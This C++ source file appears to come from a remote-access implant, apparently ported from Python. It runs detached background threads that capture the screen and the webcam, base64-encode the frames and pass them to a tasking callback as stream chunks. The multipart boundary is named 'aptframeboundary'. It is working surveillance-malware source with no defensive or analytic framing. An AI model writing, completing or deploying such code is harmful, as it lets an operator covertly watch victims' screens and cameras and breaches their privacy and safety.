#include "Streamer.h"
#include "../capture/Screenshot.h"
#include "../capture/Webcam.h"
#include "../crypto/Base64.h"
#include <thread>
#include <atomic>
#include <chrono>
#include <mutex>

namespace streaming {

    namespace {
        std::atomic<bool> screenStreamActive{false};
        std::thread screenThread;
        std::mutex screenMutex;

        std::atomic<bool> webcamStreamActive{false};
        std::thread webcamThread;
        std::mutex webcamMutex;

        void ScreenWorker(int durationSec, std::string taskId, ResultCallback callback) {
            (void)taskId;
            auto startTime = std::chrono::steady_clock::now();
            int chunkId = 0;

            while (screenStreamActive) {
                if (durationSec > 0) {
                    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - startTime).count();
                    if (elapsed >= durationSec) break;
                }

                std::vector<BYTE> jpg = capture::CaptureScreenshotJPEG();
                if (!jpg.empty()) {
                    std::string b64 = crypto::Base64Encode(jpg);
                    std::string output = "SCREEN_STREAM_CHUNK:" + b64;
                    // Task ID for chunks usually appended with counter in Python, but here we keep it simple or follow protocol
                    // Python: "screen_stream_chunk_{chunk_id}"
                    
                    callback("screen_stream_chunk_" + std::to_string(chunkId), output);
                    chunkId++;
                }

                // Minimal sleep to avoid 100% CPU, but keep high FPS
                std::this_thread::sleep_for(std::chrono::milliseconds(50));
            }

            callback("screen_stream_end", "SCREEN_STREAM_END");
            screenStreamActive = false;
        }

        void WebcamWorker(int durationSec, std::string taskId, ResultCallback callback) {
            (void)taskId;
            auto startTime = std::chrono::steady_clock::now();
            int chunkId = 0;
            // Boundary for manual multipart if needed, but our protocol wraps it in base64 result
            
            while (webcamStreamActive) {
                if (durationSec > 0) {
                    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - startTime).count();
                    if (elapsed >= durationSec) break;
                }

                std::vector<BYTE> img = capture::CaptureWebcamImage();
                if (!img.empty()) {
                    // Python builds a full Multipart frame. We will emulate specific behavior if strictly needed.
                    // Python: SWEBCAM_STREAM_CHUNK:<b64(multipart_part)>
                    // We will simplify to just sending the image bytes B64 encoded, assuming Server can handle it or we match Python exact format.
                    // Python code:
                    /*
                    part = (
                        f"--{boundary}\r\n"
                        f"Content-Type: image/jpeg\r\n"
                        f"Content-Length: {len(jpg_bytes)}\r\n"
                        f"X-Frame-Index: {chunk_id}\r\n\r\n"
                    ).encode() + jpg_bytes + b"\r\n"
                    */
                    
                    std::string boundary = "aptframeboundary";
                    std::string header = "--" + boundary + "\r\n" +
                                         "Content-Type: image/jpeg\r\n" +
                                         "Content-Length: " + std::to_string(img.size()) + "\r\n" +
                                         "X-Frame-Index: " + std::to_string(chunkId) + "\r\n\r\n";
                    
                    std::vector<BYTE> part;
                    part.insert(part.end(), header.begin(), header.end());
                    part.insert(part.end(), img.begin(), img.end());
                    part.push_back('\r'); part.push_back('\n');

                    std::string b64 = crypto::Base64Encode(part);
                    
                    callback("webcam_stream_chunk_" + std::to_string(chunkId), "SWEBCAM_STREAM_CHUNK:" + b64);
                    chunkId++;
                }

                std::this_thread::sleep_for(std::chrono::milliseconds(66)); // ~15 FPS
            }

            callback("webcam_stream_end", "SWEBCAM_STREAM_END");
            webcamStreamActive = false;
        }
    }

    void StartScreenStream(int durationSec, const std::string& taskId, ResultCallback callback) {
        std::lock_guard<std::mutex> lock(screenMutex);
        if (screenStreamActive) return;
        screenStreamActive = true;
        screenThread = std::thread(ScreenWorker, durationSec, taskId, callback);
        screenThread.detach(); // Detach to let it run background
    }

    void StopScreenStream() {
        screenStreamActive = false;
        std::lock_guard<std::mutex> lock(screenMutex);
        // Worker will exit
    }

    void StartWebcamStream(int durationSec, const std::string& taskId, ResultCallback callback) {
        std::lock_guard<std::mutex> lock(webcamMutex);
        if (webcamStreamActive) return;
        webcamStreamActive = true;
        webcamThread = std::thread(WebcamWorker, durationSec, taskId, callback);
        webcamThread.detach();
    }

    void StopWebcamStream() {
        webcamStreamActive = false;
        std::lock_guard<std::mutex> lock(webcamMutex);
    }

}
